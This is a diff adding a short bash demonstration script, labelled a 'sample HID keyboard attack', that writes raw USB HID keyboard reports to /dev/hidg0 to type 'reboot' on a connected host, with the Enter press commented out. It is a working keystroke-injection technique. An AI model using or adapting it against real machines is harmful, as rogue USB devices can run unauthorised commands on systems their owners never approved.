@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# This is a sample HID keyboard attack that will type: reboot\n
+# https://www.kernel.org/doc/Documentation/usb/gadget_hid.txt
+# https://github.com/pelya/android-keyboard-gadget/blob/master/README.md
+
+# Type: reboot
+echo -ne "\x00\x00\x00\x15\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+echo -ne "\x00\x00\x00\x08\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+echo -ne "\x00\x00\x00\x05\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+echo -ne "\x00\x00\x00\x12\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+echo -ne "\x00\x00\x00\x12\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+echo -ne "\x00\x00\x00\x17\x00\x00\x00\x00" > /dev/hidg0 
+echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
+sleep 5
+
+# enter
+#echo -ne "\x00\x00\x00\x28\x00\x00\x00\x00" > /dev/hidg0 
+#echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00"  > /dev/hidg0 
+
